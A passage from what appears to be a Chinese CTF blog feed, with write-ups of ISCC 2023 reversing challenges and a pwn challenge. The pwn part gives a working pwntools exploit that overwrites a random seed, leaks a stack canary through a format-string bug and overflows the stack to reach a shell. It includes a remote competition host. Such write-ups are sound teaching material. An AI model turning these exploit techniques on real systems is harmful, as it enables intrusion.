punctuation">;</span>LABEL_37<span class="token operator">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>v11 <span class="token operator">>=</span> v38 <span class="token punctuation">)</span>          <span class="token keyword">goto</span> LABEL_38<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置了两个指针 <code>v13</code> 和 <code>v14</code>，用于寻找两个相同且相邻的元素<br>如果遇到两个相同且相邻的元素，就累加重复次数 <code>v12</code>，直到遇到不相等的元素为止</p><p>并且：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">LABEL_37<span class="token operator">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>v11 <span class="token operator">>=</span> v38 <span class="token punctuation">)</span>          <span class="token keyword">goto</span> LABEL_38<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      v15 <span class="token operator">=</span> v37<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v39 <span class="token operator">>=</span> <span class="token number">0x10</span> <span class="token punctuation">)</span>        v15 <span class="token operator">=</span> v9<span class="token punctuation">;</span>      v49<span class="token punctuation">[</span>v10 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>v15 <span class="token operator">+</span> v11<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v12 <span class="token operator">&lt;</span> <span class="token number">10</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token operator">++</span>v10<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v12 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>LABEL_36<span class="token operator">:</span>          v12 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token keyword">goto</span> LABEL_37<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>        v49<span class="token punctuation">[</span>v10 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v12 <span class="token operator">/</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">;</span>        v10 <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      v9 <span class="token operator">=</span> v37<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      v49<span class="token punctuation">[</span>v10<span class="token operator">++</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v12 <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">;</span>      <span class="token keyword">goto</span> LABEL_36<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码根据重复次数 <code>v12</code> 将重复的字母替换成对应的数字，并存储在数组 <code>v49</code> 中</p><p>换成数字的规则是：<br>① 如果重复次数 <code>v12</code> 小于 10，则直接将其转换为字符存储<br>② 如果重复次数 <code>v12</code> 大于等于 10，则将十位数和个位数分别转换为字符存储</p><ol start="7"><li><p>因此，直接将数字替换为前面一个字符即可<br>得到 flag 为：<code>ISCC&#123;zBzyaaVzVcyavQcQzsBz&#125;</code></p></li><li><p>综上所述，程序逻辑如下：<br>① 在用户输入的数据中，先将重复的字母替换成对应的数字<br>② 然后进行 Base64 加密<br>③ 再将加密后的字符串反转<br>④ 与 <code>=onQzpXUjFldhl3YWpnVyEWe6Jke</code> 进行比较，如果相等则正确</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64  ss <span class="token operator">=</span> <span class="token string">"=onQzpXUjFldhl3YWpnVyEWe6Jke"</span>  res <span class="token operator">=</span> ss<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>  re <span class="token operator">=</span> <span class="token string">""</span>  re <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># Base64解密  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">)</span>  result <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>re<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>re<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">57</span><span class="token punctuation">:</span>  <span class="token comment"># 重复次数小于等于9（个位数）  </span>        tmp <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>re<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">48</span> <span class="token operator">-</span> <span class="token number">1</span>          result <span class="token operator">+=</span> re<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> tmp          <span class="token keyword">continue</span>      result <span class="token operator">+=</span> re<span class="token punctuation">[</span>i<span class="token punctuation">]</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ISCC&#123;"</span> <span class="token operator">+</span> result <span class="token operator">+</span> <span class="token string">"&#125;"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>ISCC{zBzyaaVzVcyavQcQzsBz}</p></blockquote><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-%E5%8F%98%E5%BD%A2%E8%AE%B08.png" alt="ISCC2023-变形记8.png"></p>]]></content>
    
    
    <summary type="html">2023 ISCC 的一道逆向题，难度不算大，但是要理清楚函数的逻辑，有一些算法的实现不太好理解，最重要的是要能看出 Base64 加密的伪代码</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>【ISCC 2023】JustDoIt</title>
    <link href="https://www.4ss1du0us.cn/2023/06af6a683e.html"/>
    <id>https://www.4ss1du0us.cn/2023/06af6a683e.html</id>
    <published>2023-06-07T12:23:24.000Z</published>
    <updated>2023-06-30T01:42:06.469Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li>对于加密算法的逆向，根据密文恢复明文</li></ul><hr><p><a href="https://iscc.isclab.org.cn/">（2023年5月1日-2023年5月25日）【ISCC 2023】JustDoIt</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>用 32 位 IDA 打开，<code>shift + F12</code> 查看与 flag 有关信息，跟进过去<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-JustDoIt1.png" alt="ISCC2023-JustDoIt1.png"><br>结合运行程序的输出可知<br><code>sub_4865AD()</code> 为 <code>printf()</code> 函数<br><code>sub_484D2F()</code> 为 <code>scanf()</code> 函数<br>其中，<code>v5</code> 为明文，<code>v8</code> 为密文</p></li><li><p>分析可知加密逻辑在 <code>sub_487C91()</code> 中，<code>sub_487C91()</code> 执行 <code>sub_499080()</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-JustDoIt2.png" alt="ISCC2023-JustDoIt2.png"><br>逻辑比较清晰了，都是一些常规运算，逆过来写一个解密函数即可<br>加密逻辑：<br>① 先将 <code>flag</code> 的每个元素减 60<br>② 然后将字符串的顺序往后顺延一位<br>③ 通过 <code>for</code> 循环把每一位字符加上其数组索引<br>④ 再通过一个 <code>for</code> 循环进行除、取余、异或等操作处理字符串</p></li><li><p>按照逻辑，编写脚本解密即可</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span>  </span>  <span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>      <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> v8<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">23</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">68</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">68</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">94</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">24</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">87</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">26</span><span class="token punctuation">;</span>        v8<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'i'</span><span class="token punctuation">;</span>    <span class="token comment">// 注意最后一位</span>      <span class="token keyword">char</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token char">'I'</span><span class="token punctuation">,</span> <span class="token char">'S'</span><span class="token punctuation">,</span> <span class="token char">'C'</span><span class="token punctuation">,</span> <span class="token char">'C'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> m <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> <span class="token operator">++</span>m <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>          v8<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token operator">*</span>key<span class="token punctuation">;</span>          v8<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">-=</span> key<span class="token punctuation">[</span>m <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">;</span>          v8<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">6</span><span class="token punctuation">;</span>          v8<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">-=</span> key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">7</span> <span class="token operator">+</span> <span class="token operator">*</span>key <span class="token operator">%</span> <span class="token number">7</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>          v8<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">-=</span> k<span class="token punctuation">;</span>        <span class="token keyword">int</span> tmp <span class="token operator">=</span> v8<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">14</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>j <span class="token punctuation">)</span>          v8<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>          v8<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">60</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> <span class="token operator">++</span>l<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> v8<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>ISCC{Just~Do~It}</p></blockquote><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-JustDoIt3.png" alt="ISCC2023-JustDoIt3.png"></p>]]></content>
    
    
    <summary type="html">2023 ISCC 的一道逆向题，主要是对加密算法逻辑的逆向，难度不大，不过要注意数组的最后一个数据给出的形式</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>【ISCC 2023】三个愿望</title>
    <link href="https://www.4ss1du0us.cn/2023/065cc69016.html"/>
    <id>https://www.4ss1du0us.cn/2023/065cc69016.html</id>
    <published>2023-06-07T09:52:37.000Z</published>
    <updated>2023-06-30T11:15:18.112Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>伪随机数绕过</p></li><li><p><mark>利用格式化字符串漏洞绕过 <code>canary</code> 金丝雀保护</mark></p></li><li><p>最后一步溢出时，跳转地址为 <code>system(&quot;/bin/sh&quot;)</code> 的地址 <code>0x4011F5</code>，比赛时使用 <code>elf.symbols[&quot;haveadoor&quot;]</code>（<code>0x4011D6</code>）在远程是可以的，但本地无法 PWN 通</p></li></ul><hr><p><a href="https://iscc.isclab.org.cn/">（2023年5月1日-2023年5月25日）【ISCC 2023】三个愿望</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>分析文件并运行：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B1.png" alt="2023ISCC-三个愿望1.png"><br>开启了金丝雀保护，栈不可执行，但没有开启 PIE 地址随机化</p></li><li><p>在 IDA 下分析：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B2.png" alt="2023ISCC-三个愿望2.png"><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B3.png" alt="2023ISCC-三个愿望3.png"><br>首先输入 <code>s</code>，<code>s</code> 的长度为 0x16，观察栈中数据，发现 <code>s</code> 的长度不足以覆盖栈上的返回地址<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B4.png" alt="2023ISCC-三个愿望4.png"><br>后面需要绕过伪随机数的校验，发现伪随机数种子 <code>seed</code> 是可以由 <code>s</code> 覆盖的<br>因此可以通过 <code>s</code> 将 <code>seed</code> 覆盖为我们设置的值，即可绕过每一次伪随机数校验</p></li><li><p>绕过伪随机数后，进入 <code>secondwish()</code> 函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B5.png" alt="2023ISCC-三个愿望5.png"><br>输入 <code>s</code> 并且 <code>printf(s)</code> 存在格式化字符串漏洞<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B7.png" alt="2023ISCC-三个愿望7.png"><br><code>s</code> 的长度为 0x10，无法覆盖栈上的返回地址，最后 <code>var_8</code> 的地方为 <code>canary</code></p></li><li><p>当执行完 <code>secondwish()</code> 函数后，<code>v3 = 1</code>，下一次循环进入 <code>thirdwish()</code> 函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B6.png" alt="2023ISCC-三个愿望6.png"><br>输入 <code>s</code> 的长度为 0x40 是可以溢出到返回地址的，但是栈中 <code>var_8</code> 处存在 <code>canary</code> 保护，不可以直接覆盖返回地址<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B8.png" alt="2023ISCC-三个愿望8.png"></p></li><li><p>同时，存在后门函数 <code>haveadoor()</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B9.png" alt="2023ISCC-三个愿望9.png"><br>查看 <code>system(&quot;/bin/sh&quot;)</code> 的地址为 <code>0x4011F5</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B10.png" alt="2023ISCC-三个愿望10.png"></p></li><li><p>所以思路就是利用 <code>thirdwish()</code> 函数中的 <code>s</code> 溢出覆盖返回地址为 <code>0x4011F5</code>，即可触发 <code>system(&quot;/bin/sh&quot;)</code><br><mark>关键就在于如何绕过金丝雀 <code>canary</code> 来覆盖返回地址</mark></p></li><li><p>由于 <code>secondwish()</code> 函数中存在格式化字符串漏洞，并且栈中也存在 <code>canary</code> 保护，因此可以利用格式化字符串漏洞将栈上的 <code>canary</code> 的值打印出来，即可获取 <code>canary</code> 的值，在 <code>thirdwish()</code> 函数中利用栈溢出覆盖时保持 <code>canary</code> 的值不动即可</p></li></ol><blockquote><p><strong>关于 canary</strong><br><em>canary 的值在程序每一次运行都是会改变的<br>但是，在一个程序的一次运行过程中，canary 的值都是相同的</em><br>因此 <code>secondwish()</code> 函数的栈中泄露出的 <code>canary</code> 的值，其实和 <code>thirdwish()</code> 函数中的 <code>canary</code> 的值是一样的</p></blockquote><ol start="8"><li>由于 <code>secondwish()</code> 函数中 <code>s</code> 距离金丝雀 <code>var_8</code> 的长度为：0x30 - 0x8 &#x3D; 0x28<br>64 位程序一个参数占用 8 字节，0x28 &#x2F; 8 &#x3D; 5，即：<code>var_8</code> 是栈上的第 5 个参数<br>64 位程序的前 6 个参数存放在寄存器 <code>RDI</code>、<code>RSI</code>、<code>RDX</code>、<code>RCX</code>、<code>R8</code>、<code>R9</code> 内，当超过 6 个参数才存入栈中<br>因此 <code>var_8</code> 的值应在第 6 + 5 &#x3D; 11 个参数的位置，使用 <code>printf(&quot;%11$p&quot;)</code> 将其泄露，这个值就是金丝雀 <code>canary</code></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token comment"># 导入ctypes库使Python可以执行C语言的函数</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/三个愿望/makewishes"</span><span class="token punctuation">)</span>haveadoor_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"haveadoor"</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 绕过随机数校验</span>    <span class="token keyword">global</span> io    lib <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/三个愿望/libc.so.6"</span><span class="token punctuation">)</span>  <span class="token comment"># C运行库</span>    lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 将种子设为1</span>    number <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">9</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 执行随机函数</span>    <span class="token keyword">return</span> number<span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/三个愿望/makewishes"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"59.110.164.72"</span><span class="token punctuation">,</span> <span class="token number">10001</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x16</span> <span class="token operator">-</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Now you can make your first wish\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 设置伪随机数种子为1</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please give me a number!\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>srand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 绕过伪随机数校验</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Now you can make your second wish!\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"%11$p"</span><span class="token punctuation">)</span>  <span class="token comment"># 格式化字符串漏洞泄露canary（栈上第11个值）</span>canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 接收canary的值</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please give me a number!\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>srand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 绕过伪随机数校验</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Now you can make your final wish!\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4011F5</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img 